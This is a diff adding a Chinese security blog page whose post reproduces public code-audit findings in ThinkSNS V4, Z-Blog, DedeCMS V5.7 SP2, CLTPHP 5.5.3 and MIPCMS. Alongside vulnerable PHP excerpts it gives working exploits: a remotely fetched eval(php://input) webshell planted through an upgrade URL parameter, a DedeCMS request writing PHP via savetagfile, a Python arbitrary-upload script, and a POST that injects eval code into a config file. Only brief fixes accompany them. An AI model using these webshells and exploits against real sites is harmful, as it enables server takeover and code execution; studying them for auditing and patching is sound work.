@@ -1,0 +1,1055 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="学习并复现一些公开的代码审计文章。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计漏洞复现学习">
+<meta property="og:url" content="http://yoursite.com/2018/03/06/Code_audit/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="学习并复现一些公开的代码审计文章。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-6/64637983.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-6/64755240.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-7/94288863.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-7/85254114.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-7/44092416.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-8/56295937.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-8/16267803.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-8/81830140.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-19/37934014.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-19/20386060.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-19/88597949.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-19/31223165.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-22/23851406.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-23/68963804.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-23/97867487.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-23/88598734.jpg">
+<meta property="og:updated_time" content="2018-03-23T06:30:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计漏洞复现学习">
+<meta name="twitter:description" content="学习并复现一些公开的代码审计文章。">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//18-3-6/64637983.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/06/Code_audit/"/>
+
+
+
+
+
+  <title>代码审计漏洞复现学习 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/06/Code_audit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">代码审计漏洞复现学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-06T13:20:46+08:00">
+                2018-03-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>学习并复现一些公开的代码审计文章。</p>
+<a id="more"></a>
+<p>20180306</p>
+<h4 id="20180308-ThinkSNS-V4-任意文件下载漏洞导致Getshell"><a href="#20180308-ThinkSNS-V4-任意文件下载漏洞导致Getshell" class="headerlink" title="20180308 ThinkSNS_V4 任意文件下载漏洞导致Getshell"></a>20180308 <a href="https://www.t00ls.net/thread-44505-1-1.html" target="_blank" rel="noopener">ThinkSNS_V4 任意文件下载漏洞导致Getshell</a></h4><p><a href="http://www.thinksns.com/experience.html" target="_blank" rel="noopener">源码下载</a></p>
+<p>存在漏洞代码<code>\ts4\apps\admin\Lib\Action\UpgradeAction.class.php</code>中的一个函数中。</p>
+<pre><code>public function step1()
+{
+    $downUrl = $_GET[&apos;upurl&apos;];
+    $downUrl = urldecode($downUrl);
+    $path = DATA_PATH.&apos;/&apos;.&apos;upgrade/&apos;.basename($downUrl);
+
+    // # 备份老配置文件
+    $oldConf = file_get_contents(CONF_PATH.&apos;/thinksns.conf.php&apos;);
+    file_put_contents(DATA_PATH.&apos;/old.thinksns.conf.php&apos;, $oldConf);
+
+    // # 下载增量包
+    is_dir(dirname($path)) or mkdir(dirname($path), 0777, true);
+    file_put_contents($path, file_get_contents($downUrl));
+    file_exists($path) or $this-&gt;showError(&apos;下载升级包失败，请检查&apos;.dirname($path).&apos;目录是否可写，如果可写，请刷新重试！&apos;);
+
+    // 验证hash判断包是否合法。
+    $filename = dirname($path).&apos;/upgrade.json&apos;;
+    $data = file_get_contents($filename);
+    $data = json_decode($data, false);
+    if (md5_file($path) != $data-&gt;md5) {
+        $this-&gt;showError(&apos;更新包校验失败，请重新执行升级.&apos;);
+    }
+</code></pre><p>函数</p>
+<pre><code>file_put_contents — 将一个字符串写入文件
+file_get_contents — 将整个文件读入一个字符串
+</code></pre><p>在这段函数中，先备份老配置文件，然后下载增量包，下载参数$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包，<br>导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。</p>
+<p>远程下载文件，在另一个服务器上创建door.php。</p>
+<pre><code>&lt;?php   
+echo &quot;&lt;?php&quot;;
+echo &quot;eval(file_get_contents(&apos;php://input&apos;));&quot;;  
+echo &quot;?&gt;&quot;;  
+?&gt;  
+</code></pre><p>远程下载     </p>
+<p><code>http://127.0.0.1:8000/ts4/index.php?app=admin&amp;mod=Upgrade&amp;act=step1&amp;upurl=http://192.168.86.194:8000/door.php</code></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-6/64637983.jpg" alt=""></p>
+<p>会在<code>ts4\data\upgrade</code>出现下载的<code>door.php</code>文件。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-6/64755240.jpg" alt=""></p>
+<h4 id="20180307-Z-Blog-1-5-1-1740-bugs"><a href="#20180307-Z-Blog-1-5-1-1740-bugs" class="headerlink" title="20180307 Z-Blog_1.5.1.1740_bugs"></a>20180307 <a href="https://github.com/ponyma233/cms/blob/master/Z-Blog_1.5.1.1740_bugs.md#web-site-physical-path-leakage" target="_blank" rel="noopener">Z-Blog_1.5.1.1740_bugs</a></h4><p>在登录后台中，存在存储型<code>XSS</code>。</p>
+<p>网站设置中。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-7/94288863.jpg" alt=""></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-7/85254114.jpg" alt=""></p>
+<p>网站标题和网站副标题中均存在<code>XSS</code>漏洞。</p>
+<p><code>ZC_BLOG_SUBNAME</code>和<code>ZC_BLOG_NAME</code>参数。</p>
+<p>通过抓包来看具体的请求参数以及相应的文件。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-7/44092416.jpg" alt=""></p>
+<p><code>/zb_system/cmd.php?act=SettingSav</code></p>
+<p>报错，泄漏网站物理路径。</p>
+<p><code>/zb_users/cache/compiled/default/module-previous.php</code></p>
+<h4 id="20180308-DedeCMS-V5-7-SP2后台存在代码执行漏洞"><a href="#20180308-DedeCMS-V5-7-SP2后台存在代码执行漏洞" class="headerlink" title="20180308 DedeCMS V5.7 SP2后台存在代码执行漏洞"></a>20180308 <a href="http://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">DedeCMS V5.7 SP2后台存在代码执行漏洞</a></h4><p><a href="https://xianzhi.aliyun.com/forum/topic/2071" target="_blank" rel="noopener">某CMS V5.7 SP2 后台Getshell</a></p>
+<p><a href="http://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">DedeCMS V5.7 SP2后台存在代码执行漏洞</a></p>
+<p><a href="http://www.dedecms.com/products/dedecms/downloads/" target="_blank" rel="noopener">下载</a></p>
+<h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h5><p>默认后台地址 <code>/dede/</code>，文件<code>dede/tpl.php</code>中的251到281行。</p>
+<pre><code>csrf_check();
+    #filename和前面正则的匹配情况
+    if(!preg_match(&quot;#^[a-z0-9_-]{1,}\.lib\.php$#i&quot;, $filename))
+    {
+        ShowMsg(&apos;文件名不合法，不允许进行操作！&apos;, &apos;-1&apos;);
+        exit();
+    }
+    require_once(DEDEINC.&apos;/oxwindow.class.php&apos;);
+    #搜索filename中匹配`\.lib\.php$#i`的部分，以空格代替
+    $tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);
+    #去掉反斜号
+    $content = stripslashes($content);
+    #拼接文件名
+    $truefile = DEDEINC.&apos;/taglib/&apos;.$filename;
+    #写入内容
+    $fp = fopen($truefile, &apos;w&apos;);
+    fwrite($fp, $content);
+    fclose($fp);
+</code></pre><p>replace处理之后赋值给变量 $tagname 。但是写入文件的时候并没有用到$tagname 。<br>那为什么有这个$tagname，拼接文件名的时候，应该是拼接<code>tagname</code></p>
+<p>利用</p>
+<pre><code>1.由于dedecms全局变量注册的特性，所以这里的content变量和filename变量可控。
+
+2.可以看到将content直接写入到文件中导致可以getshell。但是这里的文件名经过正则表达式，所以必须要.lib.php结尾。
+
+3.这里还有一个csrf_check()函数，即请求中必须要带token参数。
+</code></pre><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ol>
+<li><p>首先获取<code>token</code>。访问域名 + <code>/dede/tpl.php?action=upload</code></p>
+<p> view-source:<a href="http://127.0.0.1:8000/DedeCMS/uploads/dede/tpl.php?action=upload" target="_blank" rel="noopener">http://127.0.0.1:8000/DedeCMS/uploads/dede/tpl.php?action=upload</a></p>
+<p> d170f6bed3360da62d909d28a072c312</p>
+</li>
+</ol>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-8/56295937.jpg" alt=""></p>
+<p>2.然后访问 </p>
+<pre><code>域名 + /dede/tpl.php?filename=secnote.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=[你的token值
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-8/16267803.jpg" alt=""></p>
+<p>shell 地址</p>
+<pre><code>域名 + /include/taglib/secnote.lib.php
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-8/81830140.jpg" alt=""></p>
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1.禁止此处写入文件。</p>
+<p>2.过滤恶意标签</p>
+<h4 id="20180319【代码审计】CLTPHP-v5-5-3-任意文件上传漏洞"><a href="#20180319【代码审计】CLTPHP-v5-5-3-任意文件上传漏洞" class="headerlink" title="20180319【代码审计】CLTPHP_v5.5.3 任意文件上传漏洞"></a><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=301419949&amp;idx=1&amp;sn=0a4ab4f3c69e22aba6a69a09bcbfe009&amp;chksm=0b55ddf03c2254e6982bd0b8fca4b410462781b3435acf837ba622888aa1cd62631736f3660c&amp;mpshare=1&amp;scene=23&amp;srcid=0318lckYIwNLZKInw7H18N4w#rd" target="_blank" rel="noopener">20180319【代码审计】CLTPHP_v5.5.3 任意文件上传漏洞</a></h4><p>首先把数据库文件到近数据库中，就可以直接进行访问了。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-19/37934014.jpg" alt=""></p>
+<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><pre><code>1、漏洞文件位置：`/app/user/controller/UpFiles.php` 第5-25行：
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-19/20386060.jpg" alt=""></p>
+<p>这段代码是一个上传函数，未经用户权限验证，获取表单内容，存在权限绕过上传的情况。跟踪<code>move</code>函数：</p>
+<p>2：在文件<code>\think\library\think\File.php</code>中，第327-377行，这是一个移动文件函数。经过一系列检测上传文件，看其中的<code>check</code>验证上传函数。</p>
+<pre><code>public function move($path, $savename = true, $replace = true)
+   {
+       // 文件上传失败，捕获错误代码
+       if (!empty($this-&gt;info[&apos;error&apos;])) {
+           $this-&gt;error($this-&gt;info[&apos;error&apos;]);
+           return false;
+       }
+
+       // 检测合法性
+       if (!$this-&gt;isValid()) {
+           $this-&gt;error = &apos;upload illegal files&apos;;
+           return false;
+       }
+
+       // 验证上传
+       if (!$this-&gt;check()) {
+           return false;
+       }
+
+       $path = rtrim($path, DS) . DS;
+       // 文件保存命名规则
+       $saveName = $this-&gt;buildSaveName($savename);
+       $filename = $path . $saveName;
+
+       // 检测目录
+       if (false === $this-&gt;checkPath(dirname($filename))) {
+           return false;
+       }
+
+       // 不覆盖同名文件
+       if (!$replace &amp;&amp; is_file($filename)) {
+           $this-&gt;error = [&apos;has the same filename: {:filename}&apos;, [&apos;filename&apos; =&gt; $filename]];
+           return false;
+       }
+
+       /* 移动文件 */
+       if ($this-&gt;isTest) {
+           rename($this-&gt;filename, $filename);
+       } elseif (!move_uploaded_file($this-&gt;filename, $filename)) {
+           $this-&gt;error = &apos;upload write error&apos;;
+           return false;
+       }
+
+       // 返回 File 对象实例
+       $file = new self($filename);
+       $file-&gt;setSaveName($saveName)-&gt;setUploadInfo($this-&gt;info);
+
+       return $file;
+   }
+</code></pre><p>3:在文件<code>\think\library\think\File.php</code>中。第216-245行。</p>
+<pre><code>public function check($rule = [])
+    {
+        $rule = $rule ?: $this-&gt;validate;
+
+        /* 检查文件大小 */
+        if (isset($rule[&apos;size&apos;]) &amp;&amp; !$this-&gt;checkSize($rule[&apos;size&apos;])) {
+            $this-&gt;error = &apos;filesize not match&apos;;
+            return false;
+        }
+
+        /* 检查文件 Mime 类型 */
+        if (isset($rule[&apos;type&apos;]) &amp;&amp; !$this-&gt;checkMime($rule[&apos;type&apos;])) {
+            $this-&gt;error = &apos;mimetype to upload is not allowed&apos;;
+            return false;
+        }
+
+        /* 检查文件后缀 */
+        if (isset($rule[&apos;ext&apos;]) &amp;&amp; !$this-&gt;checkExt($rule[&apos;ext&apos;])) {
+            $this-&gt;error = &apos;extensions to upload is not allowed&apos;;
+            return false;
+        }
+
+        /* 检查图像文件 */
+        if (!$this-&gt;checkImg()) {
+            $this-&gt;error = &apos;illegal image files&apos;;
+            return false;
+        }
+
+        return true;
+    }
+</code></pre><p>在check函数中检查文件大小、Mime类型、文件后缀等，主要是从数组$rule中获取，check函数未带入参数$rule，所以取$this-&gt;validate,而validate的值在该类有定义，我们看一下$validate的值。</p>
+<p>在文件<code>\think\library\think\File.php</code>中的38-42行。</p>
+<pre><code>/**
+    * @var array 文件上传验证规则
+    */
+   protected $validate = [];
+</code></pre><p>在同文件中validate默认值为空，调用ThinkPHP的上传函数，但配置不当导致过滤函数chenk无效，导致程序在实现存在任意文件上传漏洞，攻击者无需任何权限，可直接上传恶意脚本，控制网站服务器权限。</p>
+<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><pre><code>#!/usr/bin/python
+# Bypass
+
+import requests
+import sys
+
+def cltphp_up(url):
+    header = { &apos;User-Agent&apos; : &apos;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&apos;,&apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,}   
+    geturl = url +&quot;/user/upFiles/upload&quot;
+    files = {&apos;file&apos;:(&apos;1.php&apos;,open(&apos;1.php&apos;,&apos;rb&apos;),&apos;image/peg&apos;)}
+    res = requests.post(geturl,files=files,headers=header)
+    print res.text
+
+if __name__ == &quot;__main__&quot;:
+    if len(sys.argv) == 2:
+        url = sys.argv[1]
+        cltphp_up(url)
+        sys.exit(0)
+    else:
+        print(&quot;usage: %s www.abc.com&quot; % sys.argv[0])
+        sys.exit(-1)
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-19/88597949.jpg" alt=""></p>
+<p>访问<code>http://127.0.0.1:8000/cltphp/public/uploads/20180319/e6c63118ba063b9f97f1e931622582ab.php</code></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-19/31223165.jpg" alt=""></p>
+<h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><p>1、添加上传页面的认证，通过白名单限制上传文件后缀；</p>
+<p>2、禁止上传目录脚本执行权限。</p>
+<h4 id="20180322-MIPCMS-远程写入配置文件Getshell"><a href="#20180322-MIPCMS-远程写入配置文件Getshell" class="headerlink" title="20180322 MIPCMS 远程写入配置文件Getshell"></a><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=301419963&amp;idx=1&amp;sn=0cb82aa5629b6432415c93d9f2b8eb8c&amp;chksm=0b55dde63c2254f04399a7afa7f49a3889e8eaa37d747ec1a1b70f00cc0bf94c764db1295a11&amp;mpshare=1&amp;scene=23&amp;srcid=0321pbJgBla01aN1U5GZXNlG#rd" target="_blank" rel="noopener">20180322 MIPCMS 远程写入配置文件Getshell</a></h4><h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><ol>
+<li>漏洞文件位置:<code>\app\install\controller\Install.php</code>的第13-23行：</li>
+</ol>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-22/23851406.jpg" alt=""></p>
+<p>在<code>index</code>函数中，检测是否存在<code>install.lock</code>文件，判断网站是否已经安装。检测是在<code>index</code>函数中，非初始化函数中，固在接下来的安装过程中，如果没有检测到<code>lock</code>文件，那么就存在一个绕过情况，进行<code>CMS</code>重装。</p>
+<p>同文件下的函数，第118-142行。</p>
+<pre><code>public function installPost(Request $request) {
+               header(&apos;Access-Control-Allow-Origin: *&apos;);
+               header(&apos;Access-Control-Allow-Credentials: true&apos;);
+               header(&apos;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&apos;);
+               header(&apos;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&apos;);
+           if (Request::instance()-&gt;isPost()) {
+               $dbconfig[&apos;type&apos;]=&quot;mysql&quot;;
+               $dbconfig[&apos;hostname&apos;]=input(&apos;post.dbhost&apos;);
+               $dbconfig[&apos;username&apos;]=input(&apos;post.dbuser&apos;);
+               $dbconfig[&apos;password&apos;]=input(&apos;post.dbpw&apos;);
+               $dbconfig[&apos;hostport&apos;]=input(&apos;post.dbport&apos;);
+               $dbname=strtolower(input(&apos;post.dbname&apos;));
+
+               $username = input(&apos;post.username&apos;);
+               $password = input(&apos;post.password&apos;);
+               $rpassword = input(&apos;post.rpassword&apos;);
+               if (!$username) {
+                   return jsonError(&apos;请输入用户名&apos;);
+               }
+               if (!$password) {
+                   return jsonError(&apos;请输入密码&apos;);
+               }
+               if (!$rpassword) {
+                   return jsonError(&apos;请输入重复密码&apos;);
+               }
+</code></pre><p>直接跳转到这一步，绕过index函数中<code>install.lock</code>的检测。看到，这段<code>installPost</code>函数中获取了多个参数，并没有检测<code>lock</code>文件。看下面的代码：</p>
+<pre><code>$dsn = &quot;mysql:dbname={$dbname};host={$dbconfig[&apos;hostname&apos;]};port={$dbconfig[&apos;hostport&apos;]};charset=utf8&quot;;
+               try {
+                   $db = new \PDO($dsn, $dbconfig[&apos;username&apos;], $dbconfig[&apos;password&apos;]);
+               } catch (\PDOException $e) {
+                   return jsonError(&apos;错误代码:&apos;.$e-&gt;getMessage());
+               }
+               $dbconfig[&apos;database&apos;] = $dbname;
+               $dbconfig[&apos;prefix&apos;]=trim(input(&apos;dbprefix&apos;));
+               $tablepre = input(&quot;dbprefix&quot;);
+               $sql = file_get_contents(PUBLIC_PATH.&apos;package&apos;.DS.&apos;mipcms_v_3_1_0.sql&apos;);
+               $sql = str_replace(&quot;\r&quot;, &quot;\n&quot;, $sql);
+               $sql = explode(&quot;;\n&quot;, $sql);
+               $default_tablepre = &quot;mip_&quot;;
+               $sql = str_replace(&quot; `{$default_tablepre}&quot;, &quot; `{$tablepre}&quot;, $sql);
+               foreach ($sql as $item) {
+                   $item = trim($item);
+                   if(empty($item)) continue;
+                   preg_match(&apos;/CREATE TABLE `([^ ]*)`/&apos;, $item, $matches);
+                   if($matches) {
+                       if(false !== $db-&gt;exec($item)){
+
+                       } else {
+                          return jsonError(&apos;安装失败&apos;);
+                       }
+                   } else {
+                       $db-&gt;exec($item);
+                   }
+               }
+</code></pre><p>这段函数对获取的参数进行检测，Mysql数据库连接失败会报错退出，接着进行导入数据库操作。看第172-192行。</p>
+<pre><code>if(is_array($dbconfig)){
+                    $conf = file_get_contents(PUBLIC_PATH.&apos;package&apos;.DS.&apos;database.php&apos;);
+                    foreach ($dbconfig as $key =&gt; $value) {
+                        $conf = str_replace(&quot;#{$key}#&quot;, $value, $conf);
+                    }
+                    $install = CONF_PATH;
+                    if(!is_writable($install)){
+                        return jsonError(&apos;路径：&apos;.$install.&apos;没有写入权限&apos;);
+                    }
+                    try {
+                        $fileStatus = is_file(CONF_PATH. &apos;/database.php&apos;);
+                        if ($fileStatus) {
+                             unlink(CONF_PATH. &apos;/database.php&apos;);
+                        }
+                        file_put_contents(CONF_PATH. &apos;/database.php&apos;, $conf);
+                        return jsonSuccess(&apos;配置文件写入成功&apos;,1);
+                    } catch (Exception $e) {
+                        return jsonError(&apos;database.php文件写入失败，请检查system/config 文件夹是否可写入&apos;);
+                    }
+</code></pre><p>在<code>installPost</code>函数在的最后，将参数写入配置文件<code>database.php</code>中，且未对参数进行任何的过滤，攻击者可以构造脚本代码写入配置文件。</p>
+<p>综上，首先程序流程不严谨，可以绕过install.lock检测进入installPost函数中，可直接进行CMS重装，或者通过构造参数将脚本代码写入配置文件，进一步去触发脚本代码，控制网站服务器，程序在实现上存在远程代码执行漏洞，危害极大。</p>
+<h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><h6 id="CMS-重装"><a href="#CMS-重装" class="headerlink" title="CMS 重装"></a>CMS 重装</h6><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-23/68963804.jpg" alt=""></p>
+<h6 id="远程写入配置文件Getshell"><a href="#远程写入配置文件Getshell" class="headerlink" title="远程写入配置文件Getshell"></a>远程写入配置文件Getshell</h6><p>利用php://input实现的webshell，就不必纠结于大小写了。</p>
+<p>首先在攻击者服务器上创建一个新的数据库，命名为<code>test&#39;,1=&gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;xx&#39;=&gt;&#39;</code></p>
+<p>访问 <code>192.168.145.226/index.php?s=/install/Install/installPost</code></p>
+<p><code>POST</code>内容</p>
+<pre><code>username=admin&amp;password=12345678&amp;rpassword=12345678&amp;dbport=3306&amp;dbname=test&apos;,1=&gt;eval(file_get_contents(&apos;php://input&apos;)),&apos;xx&apos;=&gt;&apos;&amp;dbhost=192.168.86.194&amp;dbuser=root&amp;dbpw=root
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-23/97867487.jpg" alt=""></p>
+<p>查看写入的内容。</p>
+<pre><code> // 数据库名
+&apos;database&apos;       =&gt; &apos;test&apos;,1=&gt;eval(file_get_contents(&apos;php://input&apos;)),&apos;xx&apos;=&gt;&apos;&apos;,
+</code></pre><p>测试。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-3-23/88598734.jpg" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/07/xss-game2/" rel="next" title="XSS Game -2">
+                <i class="fa fa-chevron-left"></i> XSS Game -2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/08/sql-injection-9-ways-bypass-web-application-firewall/" rel="prev" title="sql-injection-9-ways-bypass-web-application-firewall">
+                sql-injection-9-ways-bypass-web-application-firewall <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
